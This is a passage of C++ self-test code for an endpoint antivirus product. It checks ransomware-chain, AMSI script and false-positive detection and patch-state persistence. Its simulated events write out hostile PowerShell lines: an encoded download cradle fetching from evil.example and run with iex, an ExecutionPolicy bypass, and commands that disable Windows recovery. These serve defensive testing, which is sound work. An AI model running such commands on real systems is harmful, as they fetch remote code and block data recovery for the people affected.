        if (extensionBurstScenario.blocked &&
            hasReasonCode(extensionBurstScenario, L"REALTIME_RANSOMWARE_EXTENSION_BURST")) {
          AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
                   SelfTestStatus::Pass,
                   L"Encrypted-extension burst simulation triggered ransomware extension-burst containment. " +
                       extensionBurstScenario.details);
        } else {
          AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
                   SelfTestStatus::Fail,
                   L"Encrypted-extension burst simulation did not trigger the expected extension-burst reason path. " +
                       extensionBurstScenario.details,
                   L"Raise confidence on burst rename and encrypted-extension clustering without relying on extension lists alone.");
        }

        observeBehaviorEvent(
            EventKind::ProcessStart, L"self-test-phase2-staged-impact", L"C:\\Users\\Public\\Downloads\\invoice.docx.exe",
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            L"powershell.exe -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==; iwr https://evil.example/payload.ps1; iex $env:TEMP\\payload.ps1",
            L"S-1-5-21-1000");
        observeBehaviorEvent(
            EventKind::ScriptScan, L"self-test-phase2-staged-impact", L"C:\\Users\\Public\\AppData\\Local\\Temp\\payload.ps1",
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            L"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\AppData\\Local\\Temp\\payload.ps1",
            L"S-1-5-21-1000");

        const auto stagedImpactScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-ransomware-staged-impact",
            L"self-test-phase2-staged-impact",
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            L"powershell.exe -NoProfile -Command \"bcdedit /set {default} recoveryenabled no; reagentc /disable; $aes = New-Object System.Security.Cryptography.AesManaged\"",
            L"S-1-5-21-1000",
            kPhase2RansomwareBurstSample,
            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
            false);

        if (stagedImpactScenario.blocked &&
            hasReasonCode(stagedImpactScenario, L"REALTIME_CHAIN_RANSOMWARE_IMPACT")) {
          AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
                   SelfTestStatus::Pass,
                   L"Fenrir correlated scripted staging with recovery-inhibition impact behavior before mass encryption. " +
                       stagedImpactScenario.details);
        } else {
          AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
                   SelfTestStatus::Fail,
                   L"Fenrir did not correlate staged script activity with later impact behavior strongly enough. " +
                       stagedImpactScenario.details,
                   L"Strengthen process-lineage correlation so staging, scripting, and recovery inhibition combine into rapid containment.");
        }

        const auto benignScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-benign-bulk-io",
            L"self-test-phase2-benign-bulk-io",
            L"C:\\Program Files\\BackupSuite\\backup-agent.exe",
            L"C:\\Windows\\System32\\services.exe",
            L"backup-agent.exe --sync --incremental --verify",
            L"S-1-5-21-2000",
            kPhase2BenignBulkIoSample,
            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
            false);

        if (!benignScenario.blocked) {
          AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                   L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Pass,
                   L"Benign backup-style bulk write simulation stayed allow-only across staged files.");
        } else {
          AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                   L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Fail,
                   L"Benign backup-style bulk write simulation triggered blocking unexpectedly. " +
                       benignScenario.details,
                   L"Adjust benign bulk-I/O dampening so backup, sync, and migration workloads avoid ransomware false positives.");
        }

        const auto photoExportScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-benign-photo-export",
            L"self-test-phase2-benign-photo-export",
            L"C:\\Program Files\\FFmpeg\\bin\\ffmpeg.exe",
            L"C:\\Windows\\explorer.exe",
            L"ffmpeg.exe -i C:\\Users\\Public\\Videos\\input.mov -vf scale=1920:1080 C:\\Users\\Public\\Pictures\\export-%03d.jpg",
            L"S-1-5-21-3000",
            kPhase2BenignBulkIoSample,
            {L".jpg", L".png", L".json", L".txt", L".csv", L".jpeg"},
            false);

        if (!photoExportScenario.blocked) {
          AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
                   L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Pass,
                   L"Benign photo/video export write churn stayed allow-only across staged files.");
        } else {
          AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
                   L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Fail,
                   L"Benign photo/video export simulation triggered blocking unexpectedly. " +
                       photoExportScenario.details,
                   L"Retain dampening for trusted media export tooling while preserving destructive-write detection.");
        }

        const auto developerBuildScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-benign-developer-build",
            L"self-test-phase2-benign-developer-build",
            L"C:\\Program Files\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\MSBuild.exe",
            L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Common7\\IDE\\devenv.exe",
            L"MSBuild.exe Fenrir.sln /t:Build /p:Configuration=Release /m",
            L"S-1-5-21-4000",
            kPhase2BenignBulkIoSample,
            {L".obj", L".pdb", L".lib", L".tlog", L".cache", L".ilk"},
            false);

        if (!developerBuildScenario.blocked) {
          AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
                   L"Phase 2 developer build false-positive resistance", SelfTestStatus::Pass,
                   L"Benign developer build churn stayed allow-only across staged files.");
        } else {
          AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
                   L"Phase 2 developer build false-positive resistance", SelfTestStatus::Fail,
                   L"Benign developer build simulation triggered blocking unexpectedly. " +
                       developerBuildScenario.details,
                   L"Prevent broad cross-directory churn heuristics from tripping on normal build output workflows.");
        }

        const auto detectionPassCount = static_cast<int>(maliciousScenario.blocked) +
                                        static_cast<int>(extensionBurstScenario.blocked) +
                                        static_cast<int>(stagedImpactScenario.blocked);
        const auto benignFailCount = static_cast<int>(benignScenario.blocked) +
                                     static_cast<int>(photoExportScenario.blocked) +
                                     static_cast<int>(developerBuildScenario.blocked);
        constexpr int kDetectionScenarioCount = 3;
        constexpr int kBenignScenarioCount = 3;

        const auto maliciousPassRatePercent =
            static_cast<double>(detectionPassCount) * 100.0 / static_cast<double>(kDetectionScenarioCount);
        const auto cleanwarePassRatePercent =
            static_cast<double>(kBenignScenarioCount - benignFailCount) * 100.0 / static_cast<double>(kBenignScenarioCount);
        const auto falsePositiveRatePercent =
            static_cast<double>(benignFailCount) * 100.0 / static_cast<double>(kBenignScenarioCount);
        const auto ruleQualityScore = std::clamp(
            static_cast<int>(maliciousPassRatePercent - falsePositiveRatePercent * 0.75), 0, 100);

        const auto budgetPass = maliciousPassRatePercent >= config.phase2MinMaliciousPassRatePercent &&
                                cleanwarePassRatePercent >= config.phase2MinCleanwarePassRatePercent &&
                                falsePositiveRatePercent <= config.phase2FalsePositiveBudgetPercent &&
                                benignFailCount <= config.phase2MaxFalsePositiveFindings &&
                                ruleQualityScore >= config.phase2MinRuleQualityScore;
        AddCheck(
            report, L"phase2_rule_quality_budget", L"Phase 2 rule-quality and false-positive budget",
            budgetPass ? SelfTestStatus::Pass : SelfTestStatus::Fail,
            L"ruleQualityScore=" + std::to_wstring(ruleQualityScore) +
                L", maliciousPassRatePercent=" + std::to_wstring(maliciousPassRatePercent) +
                L", cleanwarePassRatePercent=" + std::to_wstring(cleanwarePassRatePercent) +
                L", falsePositiveRatePercent=" + std::to_wstring(falsePositiveRatePercent) +
                L", benignFailures=" + std::to_wstring(benignFailCount) + L".",
            L"Retune confidence ladders and cleanware dampening so Phase 2 preserves ransomware catch-rate while holding false positives inside budget.");

        const auto evaluateOptionalPhase2Corpus = [&report, &phase2Policy](const std::filesystem::path& corpusRoot,
                                                                            const std::wstring& checkId,
                                                                            const std::wstring& checkName,
                                                                            const std::wstring& corpusLabel) {
          if (corpusRoot.empty()) {
            AddCheck(report, checkId, checkName, SelfTestStatus::Warning,
                     corpusLabel + L" corpus path is not configured for this self-test run.",
                     L"Set the corresponding ANTIVIRUS_PHASE2_*_CORPUS_PATH value and rerun self-test.");
            return;
          }

          std::error_code error;
          if (!std::filesystem::exists(corpusRoot, error) || error) {
            AddCheck(report, checkId, checkName, SelfTestStatus::Fail,
                     corpusLabel + L" corpus path does not exist: " + corpusRoot.wstring() + L".",
                     L"Provide an existing Phase 2 corpus path before rerunning self-test.");
            return;
          }

          bool truncated = false;
          const auto samples = CollectCorpusSampleFiles(corpusRoot, ResolveCorpusFileLimit(), &truncated);
          if (samples.empty()) {
            AddCheck(report, checkId, checkName, SelfTestStatus::Fail,
                     corpusLabel + L" corpus did not yield readable files: " + corpusRoot.wstring() + L".",
                     L"Populate the Phase 2 corpus with readable files and rerun self-test.");
            return;
          }

          auto policy = phase2Policy;
          policy.cloudLookupEnabled = false;
          policy.quarantineOnMalicious = false;
          const auto findings = ScanTargets(samples, policy);
          const auto findingCount = findings.size();
          if (findingCount == 0) {
            AddCheck(report, checkId, checkName, SelfTestStatus::Pass,
                     L"Validated " + std::to_wstring(samples.size()) + L" " + corpusLabel +
                         L" file(s) with zero false-positive findings." +
                         (truncated ? L" Scan was sample-limited." : L""));
            return;
          }

          std::wstring detail = L"Detected " + std::to_wstring(findingCount) + L" false-positive candidate(s) in " +
                                corpusLabel + L" corpus.";
          const auto sampleCount = std::min<std::size_t>(findingCount, 3);
          for (std::size_t index = 0; index < sampleCount; ++index) {
            detail += L" Sample " + std::to_wstring(index + 1) + L": " + findings[index].path.wstring() +
                      L" (" + VerdictDispositionToString(findings[index].verdict.disposition) + L", reason " +
                      FirstReasonCode(findings[index]) + L").";
          }

          AddCheck(report, checkId, checkName, SelfTestStatus::Fail, detail,
                   L"Retune cleanware dampening and observe-only controls for this benign corpus before widening rollout.");
        };

        evaluateOptionalPhase2Corpus(config.phase2CleanwareCorpusPath, L"phase2_cleanware_corpus_awareness",
                                     L"Phase 2 cleanware corpus awareness", L"Phase 2 cleanware");
        evaluateOptionalPhase2Corpus(config.phase2FalsePositiveCorpusPath,
                                     L"phase2_false_positive_corpus_awareness",
                                     L"Phase 2 false-positive corpus awareness",
                                     L"Phase 2 false-positive");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
               SelfTestStatus::Fail, L"Phase 2 ransomware behavior simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
               SelfTestStatus::Fail, L"Phase 2 ransomware extension-burst simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
               SelfTestStatus::Fail, L"Phase 2 staged-impact correlation simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
               L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Fail,
               L"Phase 2 benign bulk-I/O simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
               L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Fail,
               L"Phase 2 benign photo/video export simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
               L"Phase 2 developer build false-positive resistance", SelfTestStatus::Fail,
               L"Phase 2 developer build simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase2_rule_quality_budget", L"Phase 2 rule-quality and false-positive budget",
           SelfTestStatus::Fail,
           L"Phase 2 quality-budget aggregation failed: " + Utf8ToWide(error.what()),
           L"Re-run self-test after resolving simulation/runtime errors so rule-quality budgets can be computed.");
      AddCheck(report, L"phase2_cleanware_corpus_awareness", L"Phase 2 cleanware corpus awareness",
           SelfTestStatus::Fail,
           L"Phase 2 cleanware corpus validation failed: " + Utf8ToWide(error.what()),
           L"Validate cleanware corpus configuration and rerun self-test.");
      AddCheck(report, L"phase2_false_positive_corpus_awareness", L"Phase 2 false-positive corpus awareness",
           SelfTestStatus::Fail,
           L"Phase 2 false-positive corpus validation failed: " + Utf8ToWide(error.what()),
           L"Validate false-positive corpus configuration and rerun self-test.");
    }

    try {
      auto phase3Config = config;
      phase3Config.runtimeDatabasePath = phaseValidationRoot / L"phase3-runtime.db";
      phase3Config.quarantineRootPath = phaseValidationRoot / L"phase3-quarantine";
      phase3Config.evidenceRootPath = phaseValidationRoot / L"phase3-evidence";
      phase3Config.scanExcludedPaths.clear();

      std::error_code phase3PathError;
      std::filesystem::create_directories(phase3Config.runtimeDatabasePath.parent_path(), phase3PathError);
      std::filesystem::create_directories(phase3Config.quarantineRootPath, phase3PathError);
      std::filesystem::create_directories(phase3Config.evidenceRootPath, phase3PathError);

      if (phase3PathError) {
        AddCheck(report, L"phase3_amsi_script_depth", L"Phase 3 AMSI script-depth correlation",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 3 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 3 AMSI checks.");
        AddCheck(report, L"phase3_amsi_false_positive_benign", L"Phase 3 AMSI benign-script false-positive resistance",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 3 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 3 AMSI checks.");
      } else {
        auto phase3Policy = CreateDefaultPolicySnapshot();
        phase3Policy.cloudLookupEnabled = false;
        phase3Policy.quarantineOnMalicious = false;

        const AmsiContentRequest maliciousRequest{
            .source = AmsiContentSource::Stream,
            .deviceId = L"self-test-device",
            .appName = L"PowerShell",
            .contentName = L"memory://powershell/staged-loader.ps1",
            .sessionId = 3001,
            .quiet = false,
            .content = std::vector<unsigned char>(
                kPhase3AmsiMaliciousSample,
                kPhase3AmsiMaliciousSample + std::strlen(kPhase3AmsiMaliciousSample))};
        const auto maliciousAmsi = InspectAmsiContent(maliciousRequest, phase3Policy, phase3Config);
        const auto maliciousReasoningMatched =
            (FindingHasReasonCode(maliciousAmsi.finding, L"DOWNLOAD_CRADLE") ||
             FindingHasReasonCode(maliciousAmsi.finding, L"SUSPICIOUS_C2_DESTINATION")) &&
            (FindingHasReasonCode(maliciousAmsi.finding, L"REFLECTIVE_MEMORY_LOADER") ||
             FindingHasReasonCode(maliciousAmsi.finding, L"AMSI_PATCH_BYPASS") ||
             FindingHasReasonCode(maliciousAmsi.finding, L"LOLBIN_PROXY_CHAIN"));

        if (maliciousAmsi.blocked && maliciousReasoningMatched) {
          AddCheck(report, L"phase3_amsi_script_depth", L"Phase 3 AMSI script-depth correlation",
                   SelfTestStatus::Pass,
                   L"AMSI blocked staged script content with layered delivery and memory-loader indicators (reason " +
                       FirstReasonCode(maliciousAmsi.finding) + L").");
        } else {
          AddCheck(report, L"phase3_amsi_script_depth", L"Phase 3 AMSI script-depth correlation",
                   SelfTestStatus::Fail,
                   L"AMSI did not block or fully explain the staged script chain. Disposition was " +
                       VerdictDispositionToString(maliciousAmsi.finding.verdict.disposition) + L" with reason " +
                       FirstReasonCode(maliciousAmsi.finding) + L".",
                   L"Strengthen AMSI reasoning so download cradles, suspicious destinations, and memory-loader or LOLBin signals combine into a high-confidence block.");
        }

        const AmsiContentRequest benignRequest{
            .source = AmsiContentSource::Stream,
            .deviceId = L"self-test-device",
            .appName = L"PowerShell",
            .contentName = L"memory://powershell/benign-admin-task.ps1",
            .sessionId = 3002,
            .quiet = false,
            .content = std::vector<unsigned char>(
                kPhase3AmsiBenignSample,
                kPhase3AmsiBenignSample + std::strlen(kPhase3AmsiBenignSample))};
        const auto benignAmsi = InspectAmsiContent(benignRequest, phase3Policy, phase3Config);

        if (!benignAmsi.blocked && benignAmsi.finding.verdict.disposition == VerdictDisposition::Allow) {
          AddCheck(report, L"phase3_amsi_false_positive_benign", L"Phase 3 AMSI benign-script false-positive resistance",
                   SelfTestStatus::Pass,
                   L"AMSI allowed benign administrative script content without escalating to a block.");
        } else {
          AddCheck(report, L"phase3_amsi_false_positive_benign", L"Phase 3 AMSI benign-script false-positive resistance",
                   SelfTestStatus::Fail,
                   L"AMSI treated benign administrative script content too aggressively with disposition " +
                       VerdictDispositionToString(benignAmsi.finding.verdict.disposition) + L" (reason " +
                       FirstReasonCode(benignAmsi.finding) + L").",
                   L"Retune AMSI scoring so simple administrative discovery and reporting scripts remain allow-by-default.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase3_amsi_script_depth", L"Phase 3 AMSI script-depth correlation", SelfTestStatus::Fail,
               L"Phase 3 AMSI staged-script simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
      AddCheck(report, L"phase3_amsi_false_positive_benign", L"Phase 3 AMSI benign-script false-positive resistance",
               SelfTestStatus::Fail, L"Phase 3 AMSI benign-script simulation failed: " + Utf8ToWide(error.what()),
               L"Validate local runtime/evidence paths and rerun self-test in the endpoint service context.");
    }

    try {
      auto phase4Config = config;
      phase4Config.runtimeDatabasePath = phaseValidationRoot / L"phase4-runtime.db";
      phase4Config.quarantineRootPath = phaseValidationRoot / L"phase4-quarantine";
      phase4Config.evidenceRootPath = phaseValidationRoot / L"phase4-evidence";
      phase4Config.updateRootPath = phaseValidationRoot / L"phase4-updates";
      phase4Config.scanExcludedPaths.clear();

      std::error_code phase4PathError;
      std::filesystem::create_directories(phase4Config.runtimeDatabasePath.parent_path(), phase4PathError);
      std::filesystem::create_directories(phase4Config.quarantineRootPath, phase4PathError);
      std::filesystem::create_directories(phase4Config.evidenceRootPath, phase4PathError);
      std::filesystem::create_directories(phase4Config.updateRootPath, phase4PathError);

      if (phase4PathError) {
        AddCheck(report, L"phase4_patch_policy_roundtrip", L"Phase 4 patch-policy roundtrip", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 patch-orchestration checks.");
        AddCheck(report, L"phase4_windows_patch_state_refresh", L"Phase 4 Windows patch-state refresh",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 patch-orchestration checks.");
        AddCheck(report, L"phase4_software_patch_recipe_coverage", L"Phase 4 software patch recipe coverage",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 patch-orchestration checks.");
        AddCheck(report, L"phase4_patch_visibility_snapshot", L"Phase 4 patch visibility snapshot", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 patch-orchestration checks.");
        AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 4 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, evidence, and update roots are writable before running Phase 4 release-gate checks.");
      } else {
        PatchOrchestrator patchOrchestrator(phase4Config);
        auto policy = patchOrchestrator.LoadPolicy();
        policy.autoInstallWindowsSecurity = true;
        policy.autoInstallWindowsQuality = true;
        policy.deferFeatureUpdates = true;
        policy.includeDriverUpdates = false;
        policy.includeOptionalUpdates = false;
        policy.autoUpdateHighRiskAppsOnly = true;
        policy.autoUpdateAllSupportedApps = false;
        policy.allowNativeUpdaters = true;
        policy.allowWinget = true;
        policy.allowRecipes = true;
        policy.maintenanceWindowStart = L"01:30";
        policy.maintenanceWindowEnd = L"04:30";
        policy.rebootGracePeriodMinutes = 180;
        policy.featureUpdateDeferralDays = 45;
        patchOrchestrator.SavePolicy(policy);

        const auto persistedPolicy = patchOrchestrator.LoadPolicy();
        if (persistedPolicy.maintenanceWindowStart == L"01:30" && persistedPolicy.maintenanceWindowEnd == L"04:30" &&
            persistedPolicy.rebootGracePeriodMinutes == 180 && persistedPolicy.featureUpdateDeferralDays == 45 &&
            persistedPolicy.allowWinget && persistedPolicy.allowRecipes && persistedPolicy.autoInstallWindowsSecurity) {
          AddCheck(report, L"phase4_patch_policy_roundtrip", L"Phase 4 patch-policy roundtrip", SelfTestStatus::Pass,
                   L"Patch policy persisted maintenance windows, reboot grace, provider toggles, and feature deferral settings.");
        } else {
          AddCheck(report, L"phase4_patch_policy_roundtrip", L"Phase 4 patch-policy roundtrip", SelfTestStatus::Fail,
                   L"Patch policy values did not round-trip through the runtime database cleanly.",
                   L"Validate the patch_policy table mappings so persisted maintenance, reboot, and provider controls remain stable.");
        }

        const auto refreshSummary = patchOrchestrator.RefreshPatchState();
        const auto refreshedSnapshot = patchOrchestrator.LoadSnapshot(20, 50, 20, 50);
        if (!refreshedSnapshot.policy.policyId.empty() && refreshedSnapshot.recipes.size() >= 10 &&
            refreshedSnapshot.rebootState.gracePeriodMinutes == persistedPolicy.rebootGracePeriodMinutes &&
            refreshSummary.recipeCount >= 10) {
          AddCheck(report, L"phase4_windows_patch_state_refresh", L"Phase 4 Windows patch-state refresh",
                   SelfTestStatus::Pass,
                   L"Patch orchestrator refreshed policy, reboot coordination, recipe catalog, and local patch inventory without execution errors.");
        } else {
          AddCheck(report, L"phase4_windows_patch_state_refresh", L"Phase 4 Windows patch-state refresh",
                   SelfTestStatus::Fail,
                   L"Patch orchestrator refresh did not populate the expected local policy, reboot, or recipe state surfaces.",
                   L"Validate refresh flow so Windows update discovery, reboot tracking, and inventory persistence always publish a usable local snapshot.");
        }

        RuntimeDatabase phase4Database(phase4Config.runtimeDatabasePath);
        const auto recipes = phase4Database.ListPackageRecipes(200);
        const std::vector<std::wstring> requiredRecipeIds = {
            L"google-chrome", L"microsoft-edge", L"mozilla-firefox", L"adobe-reader", L"7zip",
            L"java-runtime", L"vlc-media-player", L"notepad-plus-plus", L"microsoft-teams",
            L"zoom", L"vcpp-redistributable"};
        auto missingRecipes = std::vector<std::wstring>{};
        for (const auto& requiredRecipeId : requiredRecipeIds) {
          const auto match = std::find_if(recipes.begin(), recipes.end(), [&](const auto& recipe) {
            return recipe.recipeId == requiredRecipeId && recipe.enabled;
          });
          if (match == recipes.end()) {
            missingRecipes.push_back(requiredRecipeId);
          }
        }

        if (missingRecipes.empty()) {
          AddCheck(report, L"phase4_software_patch_recipe_coverage", L"Phase 4 software patch recipe coverage",
                   SelfTestStatus::Pass,
                   L"Phase 4 recipe catalog covers the initial high-risk household software baseline including browsers, reader, archive, runtime, conferencing, and media tooling.");
        } else {
          AddCheck(report, L"phase4_software_patch_recipe_coverage", L"Phase 4 software patch recipe coverage",
                   SelfTestStatus::Fail,
                   L"Patch recipe catalog is missing required baseline coverage entries: " +
                       std::accumulate(std::next(missingRecipes.begin()), missingRecipes.end(), missingRecipes.front(),
                                       [](std::wstring left, const std::wstring& right) { return left + L", " + right; }) +
                       L".",
                   L"Add or re-enable recipe coverage for the missing high-risk software families before promoting Phase 4.");
        }

        phase4Database.ReplaceWindowsUpdateRecords({WindowsUpdateRecord{
            .updateId = L"selftest-kb5039999",
            .revision = L"1",
            .title = L"2026-04 Cumulative Update for Windows 11",
            .kbArticles = L"KB5039999",
            .categories = L"Security Updates;Update Rollups",
            .classification = L"security",
            .severity = L"Critical",
            .updateType = L"software",
            .deploymentAction = L"installation",
            .discoveredAt = CurrentUtcTimestamp(),
            .lastAttemptAt = CurrentUtcTimestamp(),
            .status = L"failed",
            .failureCode = L"0x80240022",
            .detailJson = L"{\"canRequestUserInput\":false}",
            .installed = false,
            .hidden = false,
            .downloaded = true,
            .mandatory = true,
            .browseOnly = false,
            .rebootRequired = true,
            .driver = false,
            .featureUpdate = false,
            .optional = false}});
        phase4Database.ReplaceSoftwarePatchRecords({
            SoftwarePatchRecord{
                .softwareId = L"chrome-test",
                .displayName = L"Google Chrome",
                .displayVersion = L"123.0",
                .availableVersion = L"124.0",
                .publisher = L"Google",
                .installLocation = L"C:\\Program Files\\Google\\Chrome\\Application",
                .provider = L"native-updater",
                .providerId = L"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
                .supportedSource = L"native-updater",
                .updateState = L"available",
                .updateSummary = L"Update ready through native updater.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .supported = true,
                .highRisk = true},
            SoftwarePatchRecord{
                .softwareId = L"vpn-test",
                .displayName = L"Contoso VPN",
                .displayVersion = L"5.1",
                .publisher = L"Contoso",
                .provider = L"manual",
                .providerId = L"",
                .supportedSource = L"manual",
                .updateState = L"manual",
                .updateSummary = L"Vendor requires manual interaction.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .manualOnly = true,
                .userInteractionRequired = true},
            SoftwarePatchRecord{
                .softwareId = L"legacy-test",
                .displayName = L"Legacy Archive Tool",
                .displayVersion = L"2.0",
                .publisher = L"LegacySoft",
                .provider = L"manual",
                .providerId = L"",
                .supportedSource = L"unsupported",
                .updateState = L"unsupported",
                .updateSummary = L"Unsupported package source.",
                .lastCheckedAt = CurrentUtcTimestamp(),
                .supported = false}});
        phase4Database.UpsertPatchHistoryRecord(PatchHistoryRecord{
            .recordId = L"phase4-history-1",
            .targetType = L"windows-update",
            .targetId = L"selftest-kb5039999",
            .title = L"2026-04 Cumulative Update for Windows 11",
            .provider = L"windows-update-agent",
            .action = L"install",
            .status = L"failed",
            .startedAt = CurrentUtcTimestamp(),
            .completedAt = CurrentUtcTimestamp(),
            .errorCode = L"0x80240022",
            .detailJson = L"{\"stage\":\"install\"}",
            .rebootRequired = true});
        phase4Database.SaveRebootCoordinator(RebootCoordinatorRecord{
            .rebootRequired = true,
            .pendingWindowsUpdate = true,
            .pendingFileRename = false,
            .pendingComputerRename = false,
            .pendingComponentServicing = true,
            .rebootReasons = L"windows_update;component_servicing",
            .detectedAt = CurrentUtcTimestamp(),
            .deferredUntil = L"",
            .gracePeriodMinutes = 180,
            .status = L"pending"});

        const auto verificationSnapshot = patchOrchestrator.LoadSnapshot(10, 10, 10, 20);
        const auto hasFailedWindowsUpdate = std::any_of(
            verificationSnapshot.windowsUpdates.begin(), verificationSnapshot.windowsUpdates.end(),
            [](const auto& update) { return update.updateId == L"selftest-kb5039999" && update.status == L"failed"; });
        const auto hasManualSoftware = std::any_of(
            verificationSnapshot.software.begin(), verificationSnapshot.software.end(),
            [](const auto& software) { return software.softwareId == L"vpn-test" && software.manualOnly && software.updateState == L"manual"; });
        const auto hasUnsupportedSoftware = std::any_of(
            verificationSnapshot.software.begin(), verificationSnapshot.software.end(),
            [](const auto& software) { return software.softwareId == L"legacy-test" && !software.supported && software.updateState == L"unsupported"; });
        const auto hasFailedHistory = std::any_of(
            verificationSnapshot.history.begin(), verificationSnapshot.history.end(),
            [](const auto& item) { return item.recordId == L"phase4-history-1" && item.status == L"failed"; });

        if (verificationSnapshot.rebootState.rebootRequired && verificationSnapshot.rebootState.pendingWindowsUpdate &&
            hasFailedWindowsUpdate && hasManualSoftware && hasUnsupportedSoftware && hasFailedHistory) {
          AddCheck(report, L"phase4_patch_visibility_snapshot", L"Phase 4 patch visibility snapshot",
                   SelfTestStatus::Pass,
                   L"Patch snapshot preserved failed updates, reboot-required state, manual-only software, unsupported software, and patch history for user-facing reporting.");
        } else {
          AddCheck(report, L"phase4_patch_visibility_snapshot", L"Phase 4 patch visibility snapshot",
                   SelfTestStatus::Fail,
                   L"Patch snapshot did not preserve enough state to explain missing, failed, reboot-pending, manual-only, and unsupported patch conditions.",
                   L"Validate patch inventory, reboot coordinator, and history views so dashboard and client surfaces can explain patch posture clearly.");
        }

        const auto releaseGateRoot = phaseValidationRoot / L"phase4-release-gates";
        const auto releaseGatePackageRoot = releaseGateRoot / L"package";
        const auto releaseGateInstallRoot = releaseGateRoot / L"install";
        std::error_code releaseGatePathError;
        std::filesystem::create_directories(releaseGatePackageRoot / L"payload", releaseGatePathError);
        std::filesystem::create_directories(releaseGateInstallRoot / L"bin", releaseGatePathError);

        if (releaseGatePathError) {
          AddCheck(report, L"phase4_release_gate_blockers", L"Phase 4 release-gate blocker enforcement",
                   SelfTestStatus::Fail,
                   L"Self-test could not prepare isolated updater promotion-gate fixture paths under " +
                       releaseGateRoot.wstring() + L".",
                   L"Ensure Phase 4 release-gate fixture paths are writable before rerunning self-test.");
        } else {
          const auto payloadPath = releaseGatePackageRoot / L"payload" / L"phase4-release-gate.bin";
          if (!WriteSelfTestSample(payloadPath,
